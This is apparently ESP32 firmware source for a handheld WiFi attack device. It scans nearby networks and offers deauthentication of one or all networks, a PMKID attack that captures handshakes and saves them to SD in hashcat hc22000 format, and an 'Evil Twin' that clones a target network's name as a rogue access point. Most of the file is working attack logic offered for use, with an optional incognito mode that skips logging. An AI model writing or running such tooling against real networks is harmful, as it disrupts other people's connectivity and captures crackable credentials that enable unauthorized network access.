#include "wifi_func.h"
#include <time.h>
#include "esp_wifi.h"

#include <Politician.h>
#include <PoliticianFormat.h>
using namespace politician;
using namespace politician::format;

// --- Глобальные объекты для PMKID-атаки ---
static Politician pmkEngine;
static bool pmkEngineInitialized = false;
static bool handshakeCaptured = false;
static String lastHC22000 = "";

void pmkOnHandshake(const HandshakeRecord &rec) {
    Serial.println("PMKID Handshake captured!");
    lastHC22000 = toHC22000(rec);
    handshakeCaptured = true;
}
// ================== Конструктор ==================
WiFiAttackManager::WiFiAttackManager(LGFX& display, uint16_t displayWidth, uint16_t displayHeight,
                                     Bounce& up, Bounce& down, Bounce& left, Bounce& right, Bounce& ok,
                                     const String& logFilePath, bool incognitoMode)
    : tft(display), _w(displayWidth), _h(displayHeight),
      btnUp(up), btnDown(down), btnLeft(left), btnRight(right), btnOK(ok),
      _logFile(logFilePath), _incognitoMode(incognitoMode),
      _numNetworks(0), _selectedAPIndex(0), _attackMenuPos(0),
      _isAttacking(false), _currentAttack("")
{}

// ================== Служебные методы ==================
void WiFiAttackManager::updateButtons() {
    btnUp.update();
    btnDown.update();
    btnLeft.update();
    btnRight.update();
    btnOK.update();
}

void WiFiAttackManager::logAttack(const String& type, const String& target, const String& status) {
    if (!SDCardManager::isCardPresent() || _incognitoMode) return;
    File logFile = SD_MMC.open(_logFile, FILE_APPEND);
    if (!logFile) return;

    struct tm timeinfo;
    String timestamp = "--:--:--";
    if (getLocalTime(&timeinfo)) {
        char timeStr[20];
        strftime(timeStr, sizeof(timeStr), "%Y-%m-%d %H:%M:%S", &timeinfo);
        timestamp = String(timeStr);
    }
    logFile.println("[" + timestamp + "] " + type + " | Target: " + target + " | Status: " + status);
    logFile.close();
}

void WiFiAttackManager::initAttackMode() {
    WiFi.mode(WIFI_AP_STA);
    esp_wifi_set_promiscuous(true);
    if (_selectedAPIndex < _numNetworks) {
        esp_wifi_set_channel(_aps[_selectedAPIndex].channel, WIFI_SECOND_CHAN_NONE);
    }
}
// ================== Сканирование и отрисовка списка ==================
void WiFiAttackManager::scanWiFiNetworks() {
    tft.fillScreen(BLACK);
    tft.setTextColor(WHITE);
    tft.setTextSize(2);
    tft.setCursor(x(20), y(10));
    tft.print("Scanning WiFi...");

    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);

    int n = WiFi.scanNetworks();
    _numNetworks = min(n, MAX_APS);

    for (int i = 0; i < _numNetworks; i++) {
        _aps[i].ssid = WiFi.SSID(i);
        memcpy(_aps[i].bssid, WiFi.BSSID(i), 6);
        _aps[i].channel = WiFi.channel(i);
        _aps[i].rssi = WiFi.RSSI(i);
    }

    _selectedAPIndex = 0;
    saveScanResults();
    drawWiFiList();
}
void WiFiAttackManager::saveScanResults() {
    if (!SDCardManager::isCardPresent()) return;
    File file = SD_MMC.open("/wifi/wifi_scan_results.txt", FILE_WRITE);
    if (!file) return;

    file.println("WiFi Scan Results");
    file.println("=================");
    file.println();

    for (int i = 0; i < _numNetworks; i++) {
        file.printf("SSID: %s\n", _aps[i].ssid.c_str());
        file.printf("BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
                    _aps[i].bssid[0], _aps[i].bssid[1], _aps[i].bssid[2],
                    _aps[i].bssid[3], _aps[i].bssid[4], _aps[i].bssid[5]);
        file.printf("RSSI: %d dBm, Channel: %d\n", _aps[i].rssi, _aps[i].channel);
        file.println("-----------------");
    }
    file.close();
}
void WiFiAttackManager::drawWiFiList() {
    tft.fillScreen(BLACK);
    tft.setTextColor(WHITE);
    tft.setTextSize(1);
    tft.setCursor(x(10), y(10));
    tft.print("Found: "); tft.print(_numNetworks); tft.print(" networks");

    int maxVis = min(_numNetworks, 7);
    for (int i = 0; i < maxVis; i++) {
        int yPos = y(30) + i * y(30);
        if (i == _selectedAPIndex) {
            tft.fillRoundRect(x(5), yPos, x(230), y(25), 3, BLUE);
            tft.setTextColor(BLACK);
        } else {
            tft.drawRoundRect(x(5), yPos, x(230), y(25), 3, WHITE);
            tft.setTextColor(WHITE);
        }
        tft.setCursor(x(10), yPos + y(5));
        tft.print(_aps[i].ssid.substring(0, 20));
        tft.print(" ("); tft.print(_aps[i].rssi); tft.print("dBm)");
    }

    tft.setTextColor(LIGHT_GREY);
    tft.setCursor(x(10), y(280));
    tft.print("OK-Select");
    tft.setCursor(x(120), y(280));
    tft.print("<-Back");
    tft.setCursor(x(200), y(280));
    tft.print("Rescan");
}
// ================== Меню атаки ==================
void WiFiAttackManager::drawAttackMenu() {
    tft.fillScreen(BLACK);
    tft.setTextColor(WHITE);
    tft.setTextSize(2);
    tft.setCursor(x(10), y(10));
    tft.print(_aps[_selectedAPIndex].ssid);

    const char* attacks[] = {"1. Deauth", "2. Beacon Spam", "3. PMKID Attack", "4. Evil Twin"};
    for (int i = 0; i < 4; i++) {
        int yPos = y(40) + i * y(40);
        if (i == _attackMenuPos) {
            tft.fillRoundRect(x(5), yPos, x(230), y(35), 3, RED);
            tft.setTextColor(BLACK);
        } else {
            tft.drawRoundRect(x(5), yPos, x(230), y(35), 3, WHITE);
            tft.setTextColor(WHITE);
        }
        tft.setCursor(x(20), yPos + y(10));
        tft.print(attacks[i]);
    }
}

void WiFiAttackManager::drawDeauthScreen(const String& target, bool all) {
    tft.fillScreen(BLACK);
    tft.setTextColor(RED);
    tft.setTextSize(2);
    tft.setCursor(x(10), y(50));
    tft.print(all ? "Deauth All Running" : "Deauther Running");
    tft.setCursor(x(10), y(90));
    tft.print("SSID: " + (all ? "ALL" : target));
}

void WiFiAttackManager::drawEvilTwinScreen() {
    tft.fillScreen(BLACK);
    tft.setTextColor(RED);
    tft.setTextSize(2);
    tft.setCursor(x(10), y(50));
    tft.print("EvilTwin Running");
    tft.setCursor(x(10), y(90));
    tft.print("SSID: " + _currentTarget.ssid);
    tft.setCursor(x(10), y(130));
    tft.print("Clients: " + String(WiFi.softAPgetStationNum()));
    tft.setCursor(x(10), y(170));
    tft.print("Press <- to stop");
}

void WiFiAttackManager::drawSubmenu_I(int pos, const char* items[], int count) {
    tft.fillScreen(BLACK);
    tft.setTextSize(2);
    tft.setCursor(x(10), y(10));
    tft.print("WiFi");
    for (int i = 0; i < count; i++) {
        int yPos = y(40) + i * y(40);
        if (i == pos) {
            tft.fillRoundRect(x(5), yPos, x(230), y(35), 3, BLUE);
            tft.setTextColor(BLACK);
        } else {
            tft.drawRoundRect(x(5), yPos, x(230), y(35), 3, WHITE);
            tft.setTextColor(WHITE);
        }
        tft.setCursor(x(20), yPos + y(10));
        tft.print(items[i]);
    }
    tft.setTextSize(1);
    tft.setTextColor(RED);
    tft.setCursor(x(250), y(220));
    tft.print("<- Back");
}

// ================== Атаки ==================
void WiFiAttackManager::handleDeauthSingle() {
    if (_selectedAPIndex >= _numNetworks) return;
    _currentTarget = _aps[_selectedAPIndex];
    _isAttacking = true;
    logAttack("DEAUTH_SINGLE", _currentTarget.ssid, "STARTED");

    initAttackMode();
    start_deauth(_selectedAPIndex, DEAUTH_TYPE_SINGLE, 2);
    drawDeauthScreen(_currentTarget.ssid);

    while (_isAttacking) {
        delay(1000);
        updateButtons();
        if (btnLeft.fell()) {
            _isAttacking = false;
            stop_deauth();
            logAttack("DEAUTH_SINGLE", _currentTarget.ssid, "STOPPED_BY_USER");
        }
        delay(10);
    }
}

void WiFiAttackManager::handleDeauthAll() {
    _isAttacking = true;
    logAttack("DEAUTH_ALL", "ALL_NETWORKS", "STARTED");
    start_deauth(0, DEAUTH_TYPE_ALL, 2);
    drawDeauthScreen("ALL", true);

    while (_isAttacking) {
        updateButtons();
        if (btnLeft.fell()) {
            _isAttacking = false;
            stop_deauth();
            logAttack("DEAUTH_ALL", "ALL_NETWORKS", "STOPPED_BY_USER");
        }
        delay(10);
    }
}

void WiFiAttackManager::handleEvilTwin() {
    if (_selectedAPIndex >= _numNetworks) return;
    _currentTarget = _aps[_selectedAPIndex];
    _isAttacking = true;
    logAttack("EVIL_TWIN", _currentTarget.ssid, "STARTED");

    initAttackMode();
    WiFi.softAP(_currentTarget.ssid.c_str());
    drawEvilTwinScreen();

    while (_isAttacking) {
        delay(1000);
        updateButtons();
        if (btnLeft.fell()) {
            _isAttacking = false;
            logAttack("EVIL_TWIN", _currentTarget.ssid, "STOPPED_BY_USER");
        }
        tft.fillRect(x(100), y(130), x(50), y(20), BLACK);
        tft.setCursor(x(100), y(130));
        tft.print(String(WiFi.softAPgetStationNum()));
    }
    WiFi.softAPdisconnect(true);
    esp_wifi_set_promiscuous(false);
}

bool WiFiAttackManager::saveHC22000(const String& hc22000, const String& ssid, const uint8_t* bssid) {
    if (!SDCardManager::isCardPresent()) return false;
    if (!SD_MMC.exists("/pmkid_captures")) {
        if (!SD_MMC.mkdir("/pmkid_captures")) return false;
    }
    char bssidStr[18];
    snprintf(bssidStr, sizeof(bssidStr), "%02X%02X%02X%02X%02X%02X",
             bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
    String filename = "/pmkid_captures/" + ssid + "_" + String(bssidStr) + ".hc22000";
    File file = SD_MMC.open(filename, FILE_WRITE);
    if (!file) {
        Serial.println("Failed to open " + filename + " for writing");
        return false;
    }
    file.println(hc22000);
    file.close();
    Serial.println("Saved handshake to " + filename);
    return true;
}
void pmkOnApFound(const ApRecord &ap) {
    // Ничего не делаем, колбэк обязателен только для сканирования
}
void WiFiAttackManager::handlePMKIDSingle() {
    if (_selectedAPIndex >= _numNetworks) return;
    _currentTarget = _aps[_selectedAPIndex];
    _isAttacking = true;
    logAttack("PMKID_ATTACK", _currentTarget.ssid, "STARTED");

    // Останавливаем текущий WiFi
    WiFi.mode(WIFI_OFF);
    delay(100);

    // Инициализируем Politician при первом вызове
    if (!pmkEngineInitialized) {
        Config initialCfg;
        initialCfg.hop_dwell_ms = 200;
        initialCfg.capture_filter = LOG_FILTER_HANDSHAKES;
        initialCfg.skip_immune_networks = false;
        pmkEngine.begin(initialCfg);
        pmkEngine.setApFoundCallback(pmkOnApFound);
        pmkEngine.setEapolCallback(pmkOnHandshake);
        pmkEngineInitialized = true;
    } else {
        pmkEngine.stopHopping();
        pmkEngine.clearTarget();
    }

    // Настройка цели
    uint8_t bssid[6];
    memcpy(bssid, _currentTarget.bssid, 6);
    pmkEngine.setAttackMask(ATTACK_PMKID);
    pmkEngine.setEapolCallback(pmkOnHandshake);
    pmkEngine.setTarget(bssid, _currentTarget.channel);
    pmkEngine.lockChannel(_currentTarget.channel);
    // Очищаем состояние захвата
    lastHC22000 = "";
    handshakeCaptured = false;

    // Экран атаки
    tft.fillScreen(BLACK);
    tft.setTextColor(CYAN);
    tft.setTextSize(2);
    tft.setCursor(x(10), y(10));
    tft.print("PMKID Attack");
    tft.setTextSize(1);
    tft.setCursor(x(10), y(40));
    tft.print("Target: " + _currentTarget.ssid);
    tft.setCursor(x(10), y(60));
    char macBuf[18];
    snprintf(macBuf, sizeof(macBuf), "%02X:%02X:%02X:%02X:%02X:%02X",
             bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
    tft.print("BSSID: " + String(macBuf));
    tft.setCursor(x(10), y(80));
    tft.print("Channel: " + String(_currentTarget.channel));
    tft.setTextColor(WHITE);
    tft.setCursor(x(10), y(100));
    tft.print("Waiting for handshake...");

    unsigned long lastUpdate = 0;
    while (_isAttacking) {
        pmkEngine.tick();
        updateButtons();

        if (millis() - lastUpdate > 300) {
            // обновляем экран при необходимости
            if (handshakeCaptured) {
                tft.fillRect(x(10), y(120), x(220), y(60), BLACK);
                tft.setTextColor(GREEN);
                tft.setCursor(x(10), y(130));
                tft.print("Handshake captured!");
                tft.setCursor(x(10), y(150));
                tft.print("OK: Save to SD");
                tft.setCursor(x(10), y(170));
                tft.print("Left: Exit without save");
            }
            lastUpdate = millis();
        }

        if (btnOK.fell()) {
            if (handshakeCaptured) {
                if (saveHC22000(lastHC22000, _currentTarget.ssid, bssid)) {
                    tft.fillRect(x(10), y(180), x(200), y(20), BLACK);
                    tft.setTextColor(GREEN);
                    tft.setCursor(x(10), y(190));
                    tft.print("Saved to SD!");
                    delay(1000);
                } else {
                    tft.fillRect(x(10), y(180), x(200), y(20), BLACK);
                    tft.setTextColor(RED);
                    tft.setCursor(x(10), y(190));
                    tft.print("Save failed!");
                    delay(1000);
                }
                _isAttacking = false;
            }
        }

        if (btnLeft.fell()) {
            _isAttacking = false;
        }
        delay(10);
    }

    // Завершение
    pmkEngine.stopHopping();
    pmkEngine.clearTarget();
    WiFi.mode(WIFI_OFF);
    delay(100);
}

// ================== Главное меню WiFi (запускается из главного меню) ==================
void WiFiAttackManager::runWiFiMenu() {
    const int NUM_SUB = 5;
    const char* subItems[] = {"Scan Networks", "Deauth ALL", "Beacon Spam", "WPS Attack", "ON/OFF"};
    int subPos = 0;
    bool inSubMenu = true;

    drawSubmenu_I(subPos, subItems, NUM_SUB);

    while (inSubMenu) {
        updateButtons();

        if (btnUp.fell() && subPos > 0) { subPos--; drawSubmenu_I(subPos, subItems, NUM_SUB); }
        if (btnDown.fell() && subPos < NUM_SUB-1) { subPos++; drawSubmenu_I(subPos, subItems, NUM_SUB); }

        if (btnOK.fell()) {
            switch (subPos) {
                case 0: // Scan Networks
                    scanWiFiNetworks();
                    {
                        bool inList = true;
                        while (inList) {
                            updateButtons();
                            if (btnUp.fell() && _selectedAPIndex > 0) { _selectedAPIndex--; drawWiFiList(); }
                            if (btnDown.fell() && _selectedAPIndex < _numNetworks-1) { _selectedAPIndex++; drawWiFiList(); }
                            if (btnOK.fell() && _numNetworks > 0) {
                                _attackMenuPos = 0;
                                drawAttackMenu();
                                bool inAttackMenu = true;
                                while (inAttackMenu) {
                                    updateButtons();
                                    if (btnUp.fell() && _attackMenuPos > 0) { _attackMenuPos--; drawAttackMenu(); }
                                    if (btnDown.fell() && _attackMenuPos < 3) { _attackMenuPos++; drawAttackMenu(); }
                                    if (btnOK.fell()) {
                                        switch (_attackMenuPos) {
                                            case 0: handleDeauthSingle(); break;
                                            // case 1: beacon spam (пока нет) break;
                                            case 2: handlePMKIDSingle(); break;
                                            case 3: handleEvilTwin(); break;
                                        }
                                        inAttackMenu = false;
                                    }
                                    if (btnLeft.fell()) { inAttackMenu = false; }
                                    delay(10);
                                }
                                drawWiFiList();
                            }
                            if (btnRight.fell()) { scanWiFiNetworks(); }
                            if (btnLeft.fell()) { inList = false; }
                            delay(10);
                        }
                    }
                    break;
                case 1: handleDeauthAll(); break;
                case 2: // Beacon Spam (заглушка)
                    tft.fillScreen(BLACK);
                    tft.setCursor(x(50), y(100));
                    tft.print("Beacon Spam not implemented");
                    delay(1000);
                    break;
                case 3: // PMKID Attack
    scanWiFiNetworks();
    {
        bool inList = true;
        while (inList) {
            updateButtons();
            if (btnUp.fell() && _selectedAPIndex > 0) { _selectedAPIndex--; drawWiFiList(); }
            if (btnDown.fell() && _selectedAPIndex < _numNetworks-1) { _selectedAPIndex++; drawWiFiList(); }
            if (btnOK.fell() && _numNetworks > 0) {
                _attackMenuPos = 0;
                drawAttackMenu();
                bool inAttackMenu = true;
                while (inAttackMenu) {
                    updateButtons();
                    if (btnUp.fell() && _attackMenuPos > 0) { _attackMenuPos--; drawAttackMenu(); }
                    if (btnDown.fell() && _attackMenuPos < 3) { _attackMenuPos++; drawAttackMenu(); }
                    if (btnOK.fell()) {
                        switch (_attackMenuPos) {
                            case 0: handleDeauthSingle(); break;
                            case 2: handlePMKIDSingle(); break;
                            case 3: handleEvilTwin(); break;
                        }
                        inAttackMenu = false;
                    }
                    if (btnLeft.fell()) { inAttackMenu = false; }
                    delay(10);
                }
                drawWiFiList();
            }
            if (btnRight.fell()) { scanWiFiNetworks(); }
            if (btnLeft.fell()) { inList = false; }
            delay(10);
        }
    }
    break;
                case 4: { // ON/OFF
                    static bool wifiEnabled = false;
                    wifiEnabled = !wifiEnabled;
                    tft.fillScreen(BLACK);
                    tft.setTextColor(WHITE);
                    tft.setTextSize(2);
                    tft.setCursor(x(50), y(100));
                    tft.print("WiFi "); tft.print(wifiEnabled ? "ON" : "OFF");
                    if (wifiEnabled) {
                        WiFi.softAP("FLOPA");
                        tft.setCursor(x(20), y(140));
                        tft.print("AP: FLOPA");
                        tft.setCursor(x(20), y(170));
                        tft.print("IP: "); tft.print(WiFi.softAPIP());
                    } else {
                        WiFi.softAPdisconnect(true);
                    }
                    delay(2000);
                } break;
            }
            drawSubmenu_I(subPos, subItems, NUM_SUB);
        }

        if (btnLeft.fell()) {
            inSubMenu = false;
        }
        delay(10);
    }
}